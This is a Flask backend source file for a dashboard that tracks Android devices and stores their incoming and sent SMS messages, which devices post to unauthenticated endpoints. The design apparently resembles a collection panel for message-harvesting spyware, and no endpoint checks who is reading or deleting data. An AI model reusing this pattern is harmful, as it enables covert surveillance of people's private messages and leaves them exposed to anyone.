"""
OnyxDashboard - Flask backend for managing Android devices registered by the
OnyxBridge native library.

Provides:
  * REST API: /api/register, /api/heartbeat, /api/devices, /api/devices/<id>
  * SSE stream: /api/events  (live device updates, no polling required)
  * SPA hosting: serves the React build at / when static/dist exists
  * SQLite storage with WAL mode for high concurrency

The dashboard UI is built with React + Vite + Tailwind in ./frontend and
compiled into ./static/dist by `npm run build` (or by the Docker multi-stage
build).  In dev, run `flask run` and `npm run dev` separately — Vite proxies
/api to the Flask process.
"""
import json
import os
import queue
import sqlite3
import threading
from datetime import datetime, timedelta
from flask import (
    Flask, request, jsonify, render_template, g, abort,
    send_from_directory, Response, stream_with_context,
)

DB_PATH = os.environ.get("ONYX_DB_PATH") or os.path.join(
    # Default to a `data/` dir under the app's working directory so the DB
    # survives cold-starts within a single deploy on Render. (Render free
    # Docker services have an ephemeral filesystem across redeploys, but
    # the working dir persists across in-place container restarts.)
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "data")
    if os.access(os.path.dirname(os.path.abspath(__file__)), os.W_OK)
    else "/tmp" if os.path.isdir("/tmp") and os.access("/tmp", os.W_OK)
    else os.getcwd(),
    "onyxdashboard.db",
)
HEARTBEAT_TIMEOUT_SECONDS = int(os.environ.get("ONYX_HEARTBEAT_TIMEOUT", "5"))
DIST_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "static", "dist")

# CORS — comma-separated list of allowed origins. Default allows the deployed
# Render URL and localhost dev origins. Use "*" to allow any (not recommended
# for production with credentials, but fine for SSE since we use no cookies).
CORS_ORIGINS = [
    o.strip() for o in os.environ.get("ONYX_CORS_ORIGINS", "*").split(",") if o.strip()
] or ["*"]

app = Flask(__name__, static_folder=None)  # disable default static handler; we mount explicitly


# ---------------------------------------------------------------------------
# CORS — applied to every response, including SSE preflight
# ---------------------------------------------------------------------------
@app.after_request
def _apply_cors(resp):
    origin = request.headers.get("Origin")
    if origin and ("*" in CORS_ORIGINS or origin in CORS_ORIGINS):
        resp.headers["Access-Control-Allow-Origin"] = origin if "*" not in CORS_ORIGINS else "*"
        resp.headers["Vary"] = "Origin"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Requested-With"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, DELETE, OPTIONS"
        resp.headers["Access-Control-Allow-Credentials"] = "false"
    return resp


@app.before_request
def _handle_preflight():
    if request.method == "OPTIONS":
        return ("", 204)


# ---------------------------------------------------------------------------
# In-memory pub/sub for SSE
# ---------------------------------------------------------------------------
_subscribers: "list[queue.Queue]" = []
_sub_lock = threading.Lock()


def _publish(event_type: str, data: dict) -> None:
    """Push an SSE event to every connected /api/events client."""
    if not _subscribers:
        return
    msg = {
        "type": event_type,
        "data": data,
        "ts": datetime.utcnow().isoformat(),
    }
    payload = json.dumps(msg, default=str)
    with _sub_lock:
        for q in list(_subscribers):
            try:
                q.put_nowait(payload)
            except queue.Full:
                # Drop slow subscribers — they'll re-sync via polling fallback.
                pass


# ---------------------------------------------------------------------------
# Database helpers
# ---------------------------------------------------------------------------
def get_db():
    if "db" not in g:
        g.db = sqlite3.connect(DB_PATH)
        g.db.row_factory = sqlite3.Row
        g.db.execute("PRAGMA journal_mode=WAL;")
    return g.db


@app.teardown_appcontext
def close_db(_exc=None):
    db = g.pop("db", None)
    if db is not None:
        db.close()


def init_db():
    # Ensure the parent directory exists (the `data/` dir under the app
    # working dir might not exist on a fresh container).
    parent = os.path.dirname(DB_PATH)
    if parent and not os.path.isdir(parent):
        try:
            os.makedirs(parent, exist_ok=True)
        except OSError:
            pass  # fall back to current directory
    conn = sqlite3.connect(DB_PATH)
    conn.execute("PRAGMA journal_mode=WAL;")
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS devices (
            device_id     TEXT PRIMARY KEY,
            name          TEXT,
            model         TEXT,
            os_version    TEXT,
            app_version   TEXT,
            ip_address    TEXT,
            metadata      TEXT,
            registered_at TEXT NOT NULL,
            last_seen     TEXT NOT NULL
        )
        """
    )
    conn.execute(
        """
        CREATE TABLE IF NOT EXISTS device_sms (
            id            INTEGER PRIMARY KEY AUTOINCREMENT,
            device_id     TEXT NOT NULL,
            direction     TEXT NOT NULL,  -- 'inbox' or 'sent'
            address       TEXT,           -- sender (inbox) or recipient (sent)
            body          TEXT,
            received_at  TEXT NOT NULL
        )
        """
    )
    conn.execute(
        "CREATE INDEX IF NOT EXISTS idx_sms_device_time "
        "ON device_sms (device_id, received_at DESC)"
    )
    conn.commit()
    conn.close()


# ---------------------------------------------------------------------------
# Domain logic
# ---------------------------------------------------------------------------
def _is_online(last_seen_iso: str) -> bool:
    try:
        last = datetime.fromisoformat(last_seen_iso)
    except (ValueError, TypeError):
        return False
    return (datetime.utcnow() - last) <= timedelta(seconds=HEARTBEAT_TIMEOUT_SECONDS)


def _serialize_device(row: sqlite3.Row) -> dict:
    last_seen = row["last_seen"]
    return {
        "device_id": row["device_id"],
        "name": row["name"],
        "model": row["model"],
        "os_version": row["os_version"],
        "app_version": row["app_version"],
        "ip_address": row["ip_address"],
        "registered_at": row["registered_at"],
        "last_seen": last_seen,
        "online": _is_online(last_seen),
    }


def _get_device(device_id: str) -> "sqlite3.Row | None":
    return get_db().execute(
        "SELECT * FROM devices WHERE device_id=?", (device_id,)
    ).fetchone()


# ---------------------------------------------------------------------------
# API routes
# ---------------------------------------------------------------------------
@app.post("/api/register")
def api_register():
    payload = request.get_json(silent=True) or {}
    device_id = (payload.get("device_id") or "").strip()
    if not device_id:
        return jsonify({"ok": False, "error": "device_id is required"}), 400

    now = datetime.utcnow().isoformat()
    name = (payload.get("name") or device_id).strip()
    model = (payload.get("model") or "Unknown").strip()
    os_version = (payload.get("os_version") or "").strip()
    app_version = (payload.get("app_version") or "").strip()
    ip_address = (
        payload.get("ip_address")
        or request.headers.get("X-Forwarded-For")
        or request.remote_addr
        or ""
    )
    metadata = payload.get("metadata") or ""

    db = get_db()
    existing = _get_device(device_id)
    was_online = _is_online(existing["last_seen"]) if existing else False
    db.execute(
        """
        INSERT INTO devices
            (device_id, name, model, os_version, app_version, ip_address, metadata, registered_at, last_seen)
        VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ON CONFLICT(device_id) DO UPDATE SET
            name=excluded.name,
            model=excluded.model,
            os_version=excluded.os_version,
            app_version=excluded.app_version,
            ip_address=excluded.ip_address,
            metadata=excluded.metadata,
            last_seen=excluded.last_seen
        """,
        (device_id, name, model, os_version, app_version, ip_address, metadata, now, now),
    )
    db.commit()

    row = _get_device(device_id)
    device = _serialize_device(row) if row else None
    if device:
        if existing is None:
            # First registration — device is brand new (online by definition).
            _publish("device_registered", device)
            _publish("device_online", device)
        else:
            _publish("device_updated", device)
            if not was_online and device["online"]:
                _publish("device_online", device)

    return jsonify(
        {
            "ok": True,
            "device_id": device_id,
            "registered_at": now,
            "heartbeat_timeout_seconds": HEARTBEAT_TIMEOUT_SECONDS,
        }
    ), 201


@app.post("/api/heartbeat")
def api_heartbeat():
    payload = request.get_json(silent=True) or {}
    device_id = (payload.get("device_id") or "").strip()
    if not device_id:
        return jsonify({"ok": False, "error": "device_id is required"}), 400

    now = datetime.utcnow().isoformat()
    db = get_db()
    existing = _get_device(device_id)
    was_online = _is_online(existing["last_seen"]) if existing else False
    cur = db.execute("UPDATE devices SET last_seen=? WHERE device_id=?", (now, device_id))
    db.commit()

    if cur.rowcount == 0:
        return jsonify({"ok": False, "error": "device not registered"}), 404

    row = _get_device(device_id)
    device = _serialize_device(row) if row else None
    if device:
        _publish("heartbeat", device)
        # Publish a device_online event only if this heartbeat flipped the
        # status from offline → online. The dashboard UI uses this to show
        # a toast "Device X came online".
        if not was_online and device["online"]:
            _publish("device_online", device)

    return jsonify(
        {
            "ok": True,
            "device_id": device_id,
            "last_seen": now,
            "heartbeat_timeout_seconds": HEARTBEAT_TIMEOUT_SECONDS,
        }
    )


@app.get("/api/devices")
def api_devices():
    status = (request.args.get("status") or "").strip().lower()
    q = (request.args.get("q") or "").strip().lower()

    sql = "SELECT * FROM devices"
    clauses, params = [], []
    if status == "online":
        clauses.append("datetime(last_seen) >= datetime(?, '-' || ? || ' seconds')")
        params.extend([datetime.utcnow().isoformat(), HEARTBEAT_TIMEOUT_SECONDS])
    elif status == "offline":
        clauses.append("datetime(last_seen) < datetime(?, '-' || ? || ' seconds')")
        params.extend([datetime.utcnow().isoformat(), HEARTBEAT_TIMEOUT_SECONDS])
    if q:
        clauses.append("(LOWER(name) LIKE ? OR LOWER(device_id) LIKE ? OR LOWER(model) LIKE ?)")
        like = f"%{q}%"
        params.extend([like, like, like])
    if clauses:
        sql += " WHERE " + " AND ".join(clauses)
    sql += " ORDER BY datetime(last_seen) DESC"

    rows = get_db().execute(sql, params).fetchall()
    devices = [_serialize_device(r) for r in rows]
    return jsonify(
        {
            "ok": True,
            "count": len(devices),
            "online": sum(1 for d in devices if d["online"]),
            "offline": sum(1 for d in devices if not d["online"]),
            "devices": devices,
        }
    )


@app.delete("/api/devices/<device_id>")
def api_delete_device(device_id):
    db = get_db()
    cur = db.execute("DELETE FROM devices WHERE device_id=?", (device_id,))
    db.execute("DELETE FROM device_sms WHERE device_id=?", (device_id,))
    db.commit()
    if cur.rowcount == 0:
        return jsonify({"ok": False, "error": "device not found"}), 404
    _publish("device_deleted", {"device_id": device_id})
    return jsonify({"ok": True, "device_id": device_id})


# ---------------------------------------------------------------------------
# SMS endpoints — Android app posts incoming/outgoing SMS, dashboard reads
# ---------------------------------------------------------------------------
def _serialize_sms(row: sqlite3.Row) -> dict:
    return {
        "id": row["id"],
        "device_id": row["device_id"],
        "direction": row["direction"],   # 'inbox' or 'sent'
        "address": row["address"],
        "body": row["body"],
        "received_at": row["received_at"],
    }


@app.post("/api/devices/<device_id>/sms")
def api_post_sms(device_id):
    payload = request.get_json(silent=True) or {}
    direction = (payload.get("direction") or "inbox").strip().lower()
    if direction not in ("inbox", "sent"):
        return jsonify({"ok": False, "error": "direction must be 'inbox' or 'sent'"}), 400
    address = (payload.get("address") or "").strip()
    body = payload.get("body") or ""
    now = datetime.utcnow().isoformat()

    db = get_db()
    # Auto-register the device if not already present so an SMS-first device
    # doesn't 404 on its first SMS post.
    existing = _get_device(device_id)
    if existing is None:
        db.execute(
            "INSERT INTO devices (device_id, name, model, os_version, app_version, "
            "ip_address, metadata, registered_at, last_seen) "
            "VALUES (?, ?, ?, '', '', '', '', ?, ?)",
            (device_id, device_id, "Unknown", now, now),
        )
        db.commit()
        _publish("device_registered", _serialize_device(_get_device(device_id)))

    cur = db.execute(
        "INSERT INTO device_sms (device_id, direction, address, body, received_at) "
        "VALUES (?, ?, ?, ?, ?)",
        (device_id, direction, address, body, now),
    )
    db.commit()
    sms_id = cur.lastrowid
    sms = _serialize_sms(db.execute(
        "SELECT * FROM device_sms WHERE id=?", (sms_id,)
    ).fetchone())
    _publish("sms_received", sms)
    return jsonify({"ok": True, "sms": sms}), 201


@app.get("/api/devices/<device_id>/sms")
def api_get_sms(device_id):
    limit = int(request.args.get("limit", "50"))
    if limit < 1 or limit > 500:
        limit = 50
    rows = get_db().execute(
        "SELECT * FROM device_sms WHERE device_id=? ORDER BY datetime(received_at) DESC LIMIT ?",
        (device_id, limit),
    ).fetchall()
    messages = [_serialize_sms(r) for r in rows]
    return jsonify({
        "ok": True,
        "count": len(messages),
        "device_id": device_id,
        "messages": messages,
    })


# ---------------------------------------------------------------------------
# SSE stream — /api/events
# ---------------------------------------------------------------------------
@app.get("/api/events")
def api_events():
    q: "queue.Queue[str]" = queue.Queue(maxsize=256)
    with _sub_lock:
        _subscribers.append(q)

    def stream():
        try:
            # Initial hello — client knows the stream is alive immediately.
            hello = json.dumps({"connected": True, "time": datetime.utcnow().isoformat()})
            yield f"event: hello\ndata: {hello}\n\n"
            while True:
                try:
                    payload = q.get(timeout=15)
                    # payload is the inner JSON for the `data` field; we wrap
                    # it into an SSE message tagged with the event type.
                    msg = json.loads(payload)
                    event_type = msg.get("type", "message")
                    data_field = json.dumps(msg.get("data", {}), default=str)
                    yield f"event: {event_type}\ndata: {data_field}\n\n"
                except queue.Empty:
                    # Keep-alive comment — proxies and load balancers won't
                    # close the connection if they see traffic.
                    yield ": ping\n\n"
        finally:
            with _sub_lock:
                if q in _subscribers:
                    _subscribers.remove(q)

    headers = {
        "Content-Type": "text/event-stream; charset=utf-8",
        "Cache-Control": "no-cache, no-transform",
        "Connection": "keep-alive",
        # Disable buffering in nginx / Render's proxy
        "X-Accel-Buffering": "no",
    }
    return Response(stream_with_context(stream()), headers=headers)


# ---------------------------------------------------------------------------
# SPA hosting — serve the React build from static/dist if present
# ---------------------------------------------------------------------------
@app.get("/")
def spa_index():
    index = os.path.join(DIST_DIR, "index.html")
    if os.path.exists(index):
        return send_from_directory(DIST_DIR, "index.html")
    # Fallback to legacy Jinja template (only exists for very old deployments)
    try:
        return render_template("dashboard.html")
    except Exception:
        return (
            "OnyxDashboard backend is running. Build the React frontend with "
            "`npm run build` in ./frontend to see the dashboard.",
            200,
        )


@app.get("/<path:path>")
def spa_static(path):
    """Serve Vite assets or fall back to index.html for client-side routes."""
    full = os.path.join(DIST_DIR, path)
    if os.path.isfile(full):
        return send_from_directory(DIST_DIR, path)
    # Vite usually nests assets under /assets/<hash>.{js,css}
    index = os.path.join(DIST_DIR, "index.html")
    if os.path.exists(index):
        return send_from_directory(DIST_DIR, "index.html")
    abort(404)


@app.get("/healthz")
def healthz():
    return jsonify({"ok": True, "service": "onyxdashboard", "time": datetime.utcnow().isoformat()})


# ---------------------------------------------------------------------------
# Seed sample data (only when DB is empty) - helpful for screenshots
# ---------------------------------------------------------------------------
def seed_demo_data():
    init_db()
    conn = sqlite3.connect(DB_PATH)
    cur = conn.execute("SELECT COUNT(*) FROM devices")
    if cur.fetchone()[0] > 0:
        conn.close()
        return

    now = datetime.utcnow()
    samples = [
        ("pixel-7-pro-001", "Pixel 7 Pro", "Pixel 7 Pro", "Android 14", "1.0.4", "192.168.1.42", 5),
        ("samsung-s23-ultra-002", "S23 Ultra", "SM-S918B", "Android 14", "1.0.4", "192.168.1.51", 0),
        ("oneplus-11-003", "OnePlus 11", "CPH2449", "Android 13", "1.0.3", "192.168.1.65", 12),
        ("xiaomi-13-pro-004", "Xiaomi 13 Pro", "2210122G", "Android 14", "1.0.4", "192.168.1.78", 180),
        ("pixel-6a-005", "Pixel 6a", "Pixel 6a", "Android 14", "1.0.4", "192.168.1.92", 3),
        ("oppo-find-x6-006", "Find X6", "PHB110", "Android 13", "1.0.2", "192.168.1.110", 7200),
        ("motorola-edge-40-007", "Edge 40", "XT2307-1", "Android 13", "1.0.4", "192.168.1.121", 8),
        ("realme-gt-3-008", "Realme GT 3", "RMX3701", "Android 14", "1.0.3", "192.168.1.135", 3600),
        ("vivo-x90-pro-009", "Vivo X90 Pro", "V2241A", "Android 13", "1.0.4", "192.168.1.150", 1),
        ("pixel-fold-010", "Pixel Fold", "Pixel Fold", "Android 14", "1.0.4", "192.168.1.165", 86400),
        ("nothing-phone-2-011", "Nothing Phone 2", "A065", "Android 14", "1.0.4", "192.168.1.178", 6),
        ("asus-rog-7-012", "ROG Phone 7", "AI2205", "Android 13", "1.0.2", "192.168.1.190", 25),
    ]
    for did, name, model, osv, appv, ip, age_seconds in samples:
        ts = (now - timedelta(seconds=age_seconds)).isoformat()
        conn.execute(
            """
            INSERT INTO devices
                (device_id, name, model, os_version, app_version, ip_address, metadata, registered_at, last_seen)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """,
            (did, name, model, osv, appv, ip, "", (now - timedelta(hours=2)).isoformat(), ts),
        )
    conn.commit()
    conn.close()


# Initialise the DB on import so the dashboard is immediately usable.
init_db()


if __name__ == "__main__":
    seed_demo_data()
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", "5000")), debug=False)
